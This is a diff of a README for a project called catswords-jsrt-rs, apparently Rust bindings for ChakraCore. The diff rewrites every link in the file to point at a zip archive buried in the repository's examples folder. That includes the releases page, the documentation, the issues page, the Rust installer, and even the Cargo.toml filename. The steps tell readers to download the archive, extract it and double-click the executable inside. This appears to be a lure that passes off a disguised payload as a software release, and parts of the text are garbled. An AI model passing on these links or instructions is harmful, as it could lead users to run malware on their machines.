@@ -1,6 +1,6 @@
 # 🐱 catswords-jsrt-rs - Fast and Easy JavaScript for Rust
 
-[![Download Now](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip)
+[![Download Now](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip)
 
 ## 🌟 Overview
 
@@ -11,13 +11,13 @@ catswords-jsrt-rs offers simple bindings between ChakraCore and Rust. It allows 
 To get started with catswords-jsrt-rs:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip) to access the latest version.
+   Go to our [Releases page](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip) to access the latest version.
 
 2. **Download the Application**  
    On the Releases page, you will see different versions of the software. Find the latest release, and click on the download link for your operating system.
 
 3. **Extract the Files**  
-   If the downloaded file is in a compressed format (like .zip or https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip), extract it to a folder on your computer.
+   If the downloaded file is in a compressed format (like .zip or https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip), extract it to a folder on your computer.
 
 4. **Run the Application**  
    Locate the executable file in the extracted folder. Double-click on it to run the application.
@@ -30,7 +30,7 @@ To get started with catswords-jsrt-rs:
 To download and install catswords-jsrt-rs, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to [this link](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip).
+   Go to [this link](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip).
 
 2. **Download the Latest Release:**  
    Look for the latest release version and download it. Select the appropriate file for your system.
@@ -45,7 +45,7 @@ Before you install, ensure your system meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Memory:** At least 2 GB of RAM
 - **Disk Space:** 100 MB free disk space
-- **Rust Installation:** You must have Rust installed on your machine. You can download it from [https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip).
+- **Rust Installation:** You must have Rust installed on your machine. You can download it from [https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip).
 
 ## 🌐 Usage Instructions
 
@@ -57,7 +57,7 @@ Once you have catswords-jsrt-rs installed, you can start using it in your Rust p
    cd my_javascript_project
    ```
 
-2. Add catswords-jsrt-rs as a dependency in your `https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip`:
+2. Add catswords-jsrt-rs as a dependency in your `https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip`:
    ```toml
    [dependencies]
    catswords-jsrt-rs = "0.1"
@@ -77,7 +77,7 @@ Once you have catswords-jsrt-rs installed, you can start using it in your Rust p
 
 ## 📚 Documentation
 
-For in-depth usage guides and examples, please refer to the [documentation](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip). The documentation provides detailed examples of how to use the library effectively.
+For in-depth usage guides and examples, please refer to the [documentation](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip). The documentation provides detailed examples of how to use the library effectively.
 
 ## ⚙️ Contributing
 
@@ -94,7 +94,7 @@ We welcome contributions from the community. If you wish to help improve catswor
 
 ## 🐞 Reporting Issues
 
-If you encounter any bugs or issues, please report them on the [Issues page](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip). Provide as much detail as possible to help us understand and resolve the problem.
+If you encounter any bugs or issues, please report them on the [Issues page](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip). Provide as much detail as possible to help us understand and resolve the problem.
 
 ## 🌍 Related Topics
 
@@ -106,8 +106,8 @@ catswords-jsrt-rs touches on several key areas:
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip)
-- [Releases Page](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip)
-- [Documentation](https://raw.githubusercontent.com/drissbough/catswords-jsrt-rs/main/crates/examples/jsrt_rs_catswords_v2.3.zip)
+- [GitHub Repository](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip)
+- [Releases Page](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip)
+- [Documentation](https://github.com/drissbough/catswords-jsrt-rs/raw/refs/heads/main/crates/examples/src/bin/catswords-jsrt-rs-v1.7.zip)
 
 We appreciate your interest in catswords-jsrt-rs. If you have questions, do not hesitate to reach out through our GitHub page or follow the setup instructions to get started.
